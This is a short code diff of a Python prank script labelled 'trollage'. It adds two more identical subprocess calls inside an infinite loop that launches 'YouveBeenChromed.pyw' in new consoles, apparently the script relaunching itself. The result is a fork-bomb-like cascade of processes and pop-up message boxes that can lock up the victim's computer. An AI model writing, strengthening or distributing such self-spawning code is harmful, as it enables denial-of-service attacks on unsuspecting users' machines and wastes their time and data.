@@ -29,6 +29,8 @@ message_box = ctypes.windll.user32.MessageBoxW
 def getChromed():
     while True:
         subprocess.call('YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
+        subprocess.call('YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
+        subprocess.call('YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
         message_box(None, 'You\\'ve been chromed!', 'trollage', 0)
 
 
